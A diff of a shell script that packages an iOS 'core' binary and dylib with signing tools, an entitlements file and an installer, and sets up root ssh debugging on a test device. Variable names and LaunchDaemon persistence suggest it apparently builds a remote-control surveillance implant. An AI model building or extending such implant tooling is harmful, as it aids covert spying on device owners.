@@ -42,22 +42,26 @@ rm /tmp/ios.zip
 rm -rf /tmp/ios_tmp
 mkdir /tmp/ios_tmp
 
+mkdir /tmp/ios_tmp/win
+mkdir /tmp/ios_tmp/osx
+mkdir /tmp/ios_tmp/build
+
 cp $TOOL_DIR/codesign_allocate /tmp/ios_tmp/
-cp $TOOL_DIR/codesign_allocate.exe /tmp/ios_tmp/
+cp $TOOL_DIR/codesign_allocate.exe /tmp/ios_tmp/build
 cp $TOOL_DIR/ldid /tmp/ios_tmp/
-cp $TOOL_DIR/ldid.exe /tmp/ios_tmp/
-cp $TOOL_DIR/cygwin1.dll /tmp/ios_tmp/
+cp $TOOL_DIR/ldid.exe /tmp/ios_tmp/build
+cp $TOOL_DIR/cygwin1.dll /tmp/ios_tmp/build
 cp $TOOL_DIR/install.sh /tmp/ios_tmp/
 cp $TOOL_DIR/version /tmp/ios_tmp/
 cp $TOOL_DIR/ent.plist /tmp/ios_tmp/
 cp $INPUT /tmp/ios_tmp/core
 cp $INPUT_DYLIB /tmp/ios_tmp/dylib
-cp $TOOL_DIR/win.zip /tmp/ios_tmp/
-cp $TOOL_DIR/osx.zip /tmp/ios_tmp/
+unzip $TOOL_DIR/win.zip -d /tmp/ios_tmp/win
+unzip $TOOL_DIR/osx.zip -d /tmp/ios_tmp/osx
 
 echo "creating archive file..." >> /tmp/db_log.txt 2>&1
 
-/usr/bin/zip -j /tmp/ios.zip /tmp/ios_tmp/win.zip /tmp/ios_tmp/osx.zip /tmp/ios_tmp/dylib /tmp/ios_tmp/core /tmp/ios_tmp/codesign_allocate /tmp/ios_tmp/codesign_allocate.exe /tmp/ios_tmp/ldid /tmp/ios_tmp/ldid.exe /tmp/ios_tmp/cygwin1.dll /tmp/ios_tmp/install.sh /tmp/ios_tmp/version /tmp/ios_tmp/ent.plist
+(cd /tmp/ios_tmp;/usr/bin/zip -r /tmp/ios.zip *)
 
 sleep 1
 
@@ -129,8 +133,8 @@ mkdir $OUTPUT_DIR
 # create debug script
 #
 # cat $INSTALL_FILE | sed 's/\$RCS_BASE\/\$RCS_DIR\/\$RCS_CORE > \/dev\/null 2\>\&1.*/\/usr\/sbin\/debugserver-armv6 host:999 .\/\$RCS_CORE\)/' > $OUTPUT_DIR/debug.sh
-cat $INSTALL_FILE | sed 's/\/bin\/launchctl load \/Library\/LaunchDaemons\/\$LAUNCHD_NAME.plist.*/\(cd \$BASE\/\$DIR;\/usr\/sbin\/debugserver-armv6 host:999 .\/\$CORE\)/' > $OUTPUT_DIR/debug.sh
-chmod 755 $OUTPUT_DIR/debug.sh >> /tmp/db_log.txt 2>&1
+cat $INSTALL_FILE | sed 's/\/bin\/launchctl load \/Library\/LaunchDaemons\/\$LAUNCHD_NAME.plist.*/\(cd \$BASE\/\$DIR;\/usr\/sbin\/debugserver-armv6 host:999 .\/\$CORE\)/' > $OUTPUT_DIR/ios/debug.sh
+chmod 755 $OUTPUT_DIR/ios/debug.sh >> /tmp/db_log.txt 2>&1
 
 #
 # extracting patched core file to $DEBUG_DIR"
@@ -164,7 +168,7 @@ echo "target remote-macos $IOS_DEVICE:999" >> $DEBUG_DIR/.commands
 #
 echo "#!/bin/sh" > $DEBUG_DIR/start_debugger.sh
 echo "scp -i $TOOL_DIR/../Debug/id_iostest_rsa  -r $OUTPUT_DIR root@$IOS_DEVICE:/tmp" >> $DEBUG_DIR/start_debugger.sh
-echo "ssh -i $TOOL_DIR/../Debug/id_iostest_rsa -l root $IOS_DEVICE '(. /etc/profile; cd /tmp/ios_package/; ./debug.sh)' &" >> $DEBUG_DIR/start_debugger.sh
+echo "ssh -i $TOOL_DIR/../Debug/id_iostest_rsa -l root $IOS_DEVICE '(. /etc/profile; cd /tmp/ios_package/ios; ./debug.sh)' &" >> $DEBUG_DIR/start_debugger.sh
 echo "sleep 2" >> $DEBUG_DIR/start_debugger.sh
 echo "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/libexec/gdb/gdb-arm-apple-darwin -arch=armv6 --command=.commands" >> $DEBUG_DIR/start_debugger.sh
 chmod 755 $DEBUG_DIR/start_debugger.sh >> /tmp/db_log.txt 2>&1
